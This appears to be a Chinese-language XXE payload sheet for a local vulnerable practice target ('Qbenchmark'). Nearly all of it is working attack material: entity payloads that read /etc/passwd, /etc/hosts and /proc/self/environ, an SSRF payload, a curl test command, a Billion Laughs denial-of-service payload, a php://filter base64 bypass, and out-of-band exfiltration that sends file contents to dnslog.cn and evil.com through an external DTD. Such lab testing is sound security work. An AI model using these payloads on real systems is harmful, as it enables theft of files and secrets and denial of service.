# XXE (XML External Entity) 漏洞测试 Payload
# 用于验证 Qbenchmark 靶场中的 XXE 漏洞

## 1. XMLReader XXE Payload

### 端点
POST http://localhost:8080/xxe/xmlReader/vuln
Content-Type: application/xml

### 文件读取 Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
]>
<root>&xxe;</root>
```

### 测试命令
```bash
curl -X POST http://localhost:8080/xxe/xmlReader/vuln \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

## 4. 其他 XXE 攻击向量

### Billion Laughs DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 读取 /etc/hosts

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>&xxe;</root>
```

### 读取 /proc/self/environ

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<root>&xxe;</root>
```

### Base64 编码绕过

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

## 5. XXE Blind (OOB) 攻击

### DNS 外带

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxx.dnslog.cn/xxe">
]>
<root>&xxe;</root>
```

### HTTP 外带

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

evil.dtd 内容:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/collect?data=%data;'>">
%param;
```

TARGET="http://localhost:8080"
